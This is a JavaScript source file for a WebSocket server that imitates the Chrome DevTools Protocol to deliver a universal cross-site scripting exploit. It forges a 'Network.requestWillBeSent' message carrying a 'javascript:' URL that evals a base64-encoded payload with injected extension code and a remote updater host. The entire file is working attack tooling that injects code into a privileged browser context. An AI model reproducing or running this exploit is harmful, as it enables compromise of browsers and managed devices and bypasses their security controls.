import { WebSocketServer } from "ws";
import { createServer } from "http";
import finalhandler from "finalhandler";
import serveStatic from "serve-static";
import * as readline from 'readline-sync';
import * as fs from "fs";
import path from "path";
const WebSocket_port = 8080;
const HTTP_port = 9123;
const wss = new WebSocketServer({ port: WebSocket_port });
const serve = serveStatic("./");
console.log("hi", globalThis.module);

createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    serve(req, res, finalhandler(req, res));
}).listen(HTTP_port);
console.log(
    `The server is accessible at http://localhost:${HTTP_port}\n--------`,
);
console.log(
    `The websocket is accessible at http://localhost:${WebSocket_port}\n--------`,
);
let globalUID = 0;
let sessionId = "89AC63D12B18F3EE9808C13899C9B695";


// console.log(htmlFile);
function requireFromString(s) {
    const Module = module.constructor;
    var m = new Module();
    m._compile(s);
    return m.exports;
}

let serverConfig = "{\"updater_url\": \"rigtools.asyncsmasher.com\"}"; 
try {
    serverConfig =  fs.readFileSync('server_config.json');
} catch (e) {
    console.log(`Using default update url ${JSON.parse(serverConfig).updater_url} because it failed to read the file: \n${e}`);
}

wss.on("connection", function connection(wss_con) {
    wss_con.on("message", async (msg) => {
        
        const result = {
            payload1: eval(fs.readFileSync('payload.mjs'))
        }
        let htmlFile = fs.readFileSync(new URL('./payloads/index.html', import.meta.url)).toString();
        htmlFile.replace('`', '&#96;');
        let jsFile = fs.readFileSync(new URL('./payloads/index.js', import.meta.url)).toString();
        // jsFile = jsFile.replace('`', '\\`').replace('\'', '\\\'').replace('"', '\\"');
        // console.log(result.payload1.toString());
        let json_msg = JSON.parse(msg.toString());
        let { id, method, params } = json_msg;
        console.log(id + "> ", method, params);
        const entry = fs.readFileSync('./entry/entry.html');

        if (method === "Target.setDiscoverTargets") {
            wss_con.send(
                JSON.stringify({
                    method: "Network.requestWillBeSent",
                    params: {
                        request: {
                            url: `javascript: (function () {eval(atob("${btoa(`(${result.payload1.toString().replace("%%EXTJS%%", btoa(jsFile)).replace("%%EXTHTML%%", btoa(htmlFile)).replace(/%%updaterurl%%/g, JSON.parse(serverConfig).updater_url).replace('%%HTMLENTRY%%', btoa(entry.toString()))})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
                        },
                    },
                }),
            );
            
            // setTimeout(function() {
            //     wss_con.send(
            //         JSON.stringify({
            //             method: "Network.requestWillBeSent",
            //             params: {
            //                 request: {
            //                     url: `javascript: (function () {eval(atob("${btoa(`(${payload2.toString()})()`)}"))})()`,
            //                 },
            //             },
            //         }),
            //     );
            // }, 200);
        }

        wss_con.send(
            JSON.stringify({
                id: id,
                error: null,
                sessionId: sessionId,
                result: {},
            }),
        );
    });
});
